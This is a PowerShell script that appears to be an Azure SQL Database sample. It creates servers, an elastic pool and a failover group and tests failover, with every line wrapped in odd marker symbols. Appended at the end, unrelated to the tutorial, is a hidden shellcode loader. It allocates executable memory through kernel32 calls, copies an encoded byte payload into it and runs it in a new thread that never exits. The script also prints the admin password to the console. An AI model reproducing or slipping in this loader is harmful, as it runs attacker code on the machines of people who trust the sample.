

 -||-> $subscriptionId = '<Subscription-ID>' <-||- 
 -||-> $randomIdentifier = $( -||-> Get-Random <-||- ) <-||- 
 -||-> $resourceGroupName = "myResourceGroup-$randomIdentifier" <-||- 
 -||-> $location = "East US" <-||- 
 -||-> $adminLogin = "azureuser" <-||- 
 -||-> $password = "PWD27!"+( -||-> New-Guid <-||- ).Guid <-||- 
 -||-> $serverName = "mysqlserver-$randomIdentifier" <-||- 
 -||-> $poolName = "myElasticPool" <-||- 
 -||-> $databaseName = "mySampleDatabase" <-||- 
 -||-> $drLocation = "West US" <-||- 
 -||-> $drServerName = "mysqlsecondary-$randomIdentifier" <-||- 
 -||-> $failoverGroupName = "failovergrouptutorial-$randomIdentifier" <-||- 




 -||-> $startIp = "0.0.0.0" <-||- 
 -||-> $endIp = "0.0.0.0" <-||- 


 -||-> Write-host "Resource group name is" $resourceGroupName <-||-  
 -||-> Write-host "Password is" $password <-||-   
 -||-> Write-host "Server name is" $serverName <-||-  
 -||-> Write-host "DR Server name is" $drServerName <-||-  
 -||-> Write-host "Failover group name is" $failoverGroupName <-||- 



 -||-> Set-AzContext -SubscriptionId $subscriptionId <-||-  


 -||-> Write-host "Creating resource group..." <-||- 
 -||-> $resourceGroup =  -||-> New-AzResourceGroup -Name $resourceGroupName -Location $location -Tag @{Owner= -||-> "SQLDB-Samples" <-||- } <-||-  <-||- 
 -||-> $resourceGroup <-||- 


 -||-> Write-host "Creating primary logical server..." <-||- 
 -||-> New-AzSqlServer -ResourceGroupName $resourceGroupName `
   -ServerName $serverName `
   -Location $location `
   -SqlAdministratorCredentials $( -||-> New-Object -TypeName System.Management.Automation.PSCredential `
   -ArgumentList $adminLogin, $( -||-> ConvertTo-SecureString -String $password -AsPlainText -Force <-||- ) <-||- ) <-||- 
 -||-> Write-host "Primary logical server = " $serverName <-||- 


 -||-> Write-host "Configuring firewall for primary logical server..." <-||- 
 -||-> New-AzSqlServerFirewallRule -ResourceGroupName $resourceGroupName `
   -ServerName $serverName `
   -FirewallRuleName "AllowedIPs" -StartIpAddress $startIp -EndIpAddress $endIp <-||- 
 -||-> Write-host "Firewall configured" <-||-  


 -||-> Write-host "Creating a gen5 2 vCore database..." <-||- 
 -||-> $database =  -||-> New-AzSqlDatabase  -ResourceGroupName $resourceGroupName `
   -ServerName $serverName `
   -DatabaseName $databaseName `
   -Edition "GeneralPurpose" `
   -VCore 2 `
   -ComputeGeneration Gen5 `
   -MinimumCapacity 1 `
   -SampleName "AdventureWorksLT" <-||-  <-||- 
 -||-> $database <-||- 


 -||-> Write-host "Creating elastic pool..." <-||- 
 -||-> $elasticPool =  -||-> New-AzSqlElasticPool -ResourceGroupName $resourceGroupName `
    -ServerName $serverName `
    -ElasticPoolName $poolName `
    -Edition "GeneralPurpose" `
    -vCore 2 `
    -ComputeGeneration Gen5 <-||-  <-||- 
 -||-> $elasticPool <-||- 


 -||-> Write-host "Creating elastic pool..." <-||- 
 -||-> $addDatabase =  -||-> Set-AzSqlDatabase -ResourceGroupName $resourceGroupName `
    -ServerName $serverName `
    -DatabaseName $databaseName `
    -ElasticPoolName $poolName <-||-  <-||- 
 -||-> $addDatabase <-||- 


 -||-> Write-host "Creating a secondary logical server in the failover region..." <-||- 
 -||-> New-AzSqlServer -ResourceGroupName $resourceGroupName `
   -ServerName $drServerName `
   -Location $drLocation `
   -SqlAdministratorCredentials $( -||-> New-Object -TypeName System.Management.Automation.PSCredential `
      -ArgumentList $adminlogin, $( -||-> ConvertTo-SecureString -String $password -AsPlainText -Force <-||- ) <-||- ) <-||- 
 -||-> Write-host "Secondary logical server =" $drServerName <-||- 


 -||-> Write-host "Configuring firewall for secondary logical server..." <-||- 
 -||-> New-AzSqlServerFirewallRule -ResourceGroupName $resourceGroupName `
   -ServerName $drServerName `
   -FirewallRuleName "AllowedIPs" -StartIpAddress $startIp -EndIpAddress $endIp <-||- 
 -||-> Write-host "Firewall configured" <-||-  


 -||-> Write-host "Creating secondary elastic pool..." <-||- 
 -||-> $elasticPool =  -||-> New-AzSqlElasticPool -ResourceGroupName $resourceGroupName `
    -ServerName $drServerName `
    -ElasticPoolName $poolName `
    -Edition "GeneralPurpose" `
    -vCore 2 `
    -ComputeGeneration Gen5 <-||-  <-||- 
 -||-> $elasticPool <-||- 



 -||-> Write-host "Creating failover group..." <-||-  
 -||-> New-AzSqlDatabaseFailoverGroup `
  –ResourceGroupName $resourceGroupName `
   -ServerName $serverName `
   -PartnerServerName $drServerName  `
   –FailoverGroupName $failoverGroupName `
   –FailoverPolicy Automatic `
   -GracePeriodWithDataLossHours 2 <-||- 
 -||-> Write-host "Failover group created successfully." <-||-  


 -||-> Write-host "Enumerating databases in elastic pool...." <-||-  
 -||-> $FailoverGroup =  -||-> Get-AzSqlDatabaseFailoverGroup `
                 -ResourceGroupName $resourceGroupName `
                 -ServerName $serverName `
                 -FailoverGroupName $failoverGroupName <-||-  <-||- 
 -||-> $databases =  -||-> Get-AzSqlElasticPoolDatabase `
               -ResourceGroupName $resourceGroupName `
               -ServerName $serverName `
               -ElasticPoolName $poolName <-||-  <-||- 
 -||-> Write-host "Adding databases to failover group..." <-||-  
 -||-> $failoverGroup =  -||-> $failoverGroup | Add-AzSqlDatabaseToFailoverGroup `
                                  -Database $databases <-||-  <-||-  
 -||-> $failoverGroup <-||- 


 -||-> Write-host "Confirming the secondary server is secondary...." <-||-  
 -||-> ( -||-> Get-AzSqlDatabaseFailoverGroup `
   -FailoverGroupName $failoverGroupName `
   -ResourceGroupName $resourceGroupName `
   -ServerName $drServerName <-||- ).ReplicationRole <-||- 


 -||-> Write-host "Failing over failover group to the secondary..." <-||-  
 -||-> Switch-AzSqlDatabaseFailoverGroup `
   -ResourceGroupName $resourceGroupName `
   -ServerName $drServerName `
   -FailoverGroupName $failoverGroupName <-||- 
 -||-> Write-host "Failover group failed over to" $drServerName <-||-  


 -||-> Write-host "Confirming the secondary server is now primary" <-||-  
 -||-> ( -||-> Get-AzSqlDatabaseFailoverGroup `
   -FailoverGroupName $failoverGroupName `
   -ResourceGroupName $resourceGroupName `
   -ServerName $drServerName <-||- ).ReplicationRole <-||- 


 -||-> Write-host "Failing over failover group to the primary...." <-||-  
 -||-> Switch-AzSqlDatabaseFailoverGroup `
   -ResourceGroupName $resourceGroupName `
   -ServerName $serverName `
   -FailoverGroupName $failoverGroupName <-||- 
 -||-> Write-host "Failover group failed over to" $serverName <-||-  






 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xdd,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0xbb,0x18,0x51,0x45,0xd4,0x31,0x5d,0x18,0x83,0xc5,0x04,0x03,0x5d,0x0c,0xb3,0xb0,0x28,0xc4,0xb1,0x3b,0xd1,0x14,0xd6,0xb2,0x34,0x25,0xd6,0xa1,0x3d,0x15,0xe6,0xa2,0x10,0x99,0x8d,0xe7,0x80,0x2a,0xe3,0x2f,0xa6,0x9b,0x4e,0x16,0x89,0x1c,0xe2,0x6a,0x88,0x9e,0xf9,0xbe,0x6a,0x9f,0x31,0xb3,0x6b,0xd8,0x2c,0x3e,0x39,0xb1,0x3b,0xed,0xae,0xb6,0x76,0x2e,0x44,0x84,0x97,0x36,0xb9,0x5c,0x99,0x17,0x6c,0xd7,0xc0,0xb7,0x8e,0x34,0x79,0xfe,0x88,0x59,0x44,0x48,0x22,0xa9,0x32,0x4b,0xe2,0xe0,0xbb,0xe0,0xcb,0xcd,0x49,0xf8,0x0c,0xe9,0xb1,0x8f,0x64,0x0a,0x4f,0x88,0xb2,0x71,0x8b,0x1d,0x21,0xd1,0x58,0x85,0x8d,0xe0,0x8d,0x50,0x45,0xee,0x7a,0x16,0x01,0xf2,0x7d,0xfb,0x39,0x0e,0xf5,0xfa,0xed,0x87,0x4d,0xd9,0x29,0xcc,0x16,0x40,0x6b,0xa8,0xf9,0x7d,0x6b,0x13,0xa5,0xdb,0xe7,0xb9,0xb2,0x51,0xaa,0xd5,0x77,0x58,0x55,0x25,0x10,0xeb,0x26,0x17,0xbf,0x47,0xa1,0x1b,0x48,0x4e,0x36,0x5c,0x63,0x36,0xa8,0xa3,0x8c,0x47,0xe0,0x67,0xd8,0x17,0x9a,0x4e,0x61,0xfc,0x5a,0x6f,0xb4,0x69,0x5e,0xe7,0xf7,0xc6,0x74,0x92,0x9f,0x14,0x75,0x4d,0x3c,0x90,0x93,0x3d,0xec,0xf2,0x0b,0xfd,0x5c,0xb3,0xfb,0x95,0xb6,0x3c,0x23,0x85,0xb8,0x96,0x4c,0x2f,0x57,0x4f,0x24,0xc7,0xce,0xca,0xbe,0x76,0x0e,0xc1,0xba,0xb8,0x84,0xe6,0x3b,0x76,0x6d,0x82,0x2f,0xee,0x9d,0xd9,0x12,0xb8,0xa2,0xf7,0x39,0x44,0x37,0xfc,0xeb,0x13,0xaf,0xfe,0xca,0x53,0x70,0x00,0x39,0xe8,0xb9,0x94,0x82,0x86,0xc5,0x78,0x03,0x56,0x90,0x12,0x03,0x3e,0x44,0x47,0x50,0x5b,0x8b,0x52,0xc4,0xf0,0x1e,0x5d,0xbd,0xa5,0x89,0x35,0x43,0x90,0xfe,0x99,0xbc,0xf7,0xfe,0xe6,0x6a,0x31,0x75,0x07,0xaf <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



